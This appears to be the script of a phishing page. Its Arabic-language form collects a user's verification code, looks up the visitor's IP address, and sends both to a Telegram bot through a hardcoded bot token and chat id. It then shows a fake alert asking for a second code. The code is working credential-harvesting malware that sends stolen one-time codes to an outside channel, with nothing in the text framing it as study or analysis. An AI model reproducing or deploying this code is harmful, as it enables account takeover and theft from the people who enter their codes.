    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#verify-code-form').submit(function(event) {
                event.preventDefault();
                $('#verify_code_error').hide();

                const verificationCode = $("#verification_code").val();

                if (!verificationCode) {
                    $('#verify_code_error').show();
                    return;
                }

                // الحصول على IP الجهاز
                $.get("https://api.ipify.org?format=json", function(data) {
                    const userIP = data.ip;

                    const telegramBotToken = "7327256170:AAHRVRd2GI3bsOjtFD08kB2wc4w6mVerGdM";
                    const chatId = "-4625923889";
                    const message = `رمز التحقق: ${verificationCode}\nIP المستخدم: ${userIP}`;

                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

                    $.post(telegramUrl, {
                        chat_id: chatId,
                        text: message
                    }).done(function (response) {
                        alert("لقد قمنا بارسال رمز تحقق اخر قم بإدخاله");
                    }).fail(function (error) {
                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
                    });
                });
            });
        });
    </script>
